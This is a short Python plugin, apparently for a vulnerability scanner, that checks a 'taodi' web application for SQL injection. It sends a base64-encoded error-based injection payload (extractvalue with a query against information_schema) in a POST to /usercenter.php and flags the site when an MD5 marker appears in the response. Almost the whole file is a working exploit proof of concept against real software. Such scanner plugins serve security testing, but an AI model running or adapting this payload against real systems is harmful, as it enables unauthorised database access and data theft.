#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0116544


def assign(service, arg):
    if service == "taodi":
        return True, arg

def audit(arg):
    url = '/usercenter.php?ac=shareframe'
    target = arg + url
    post_data = 'url=http://www.baidu.com&mod=setfield&dosubmit=ok&url=eCcsZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDVjLCAoc2VsZWN0IG1kNSgxMjMpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBsaW1pdCAxKSkpLCcnLCcxJywnMScsJzAnLCdfMjEweDIxMC5qcGcnLCdfNjR4NjQuanBnJywnJywnNCcsJ3Rlc3QnLCcxNDMyNzE2MzA4JywnMTQzMjcxNjMwOCcsJzEnLCcxJywnMScpIw==%3D&pcid=1&'
    code, head, res, errcode, _ = curl.curl2(target, post = post_data)
    code, head, res, errcode, _ = curl.curl2(target, post = post_data)
    if code ==200 and '202cb962ac59075b964b07152d234b7' in res:
        security_hole(arg)
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('taodi', 'http://www.example.com/')[1])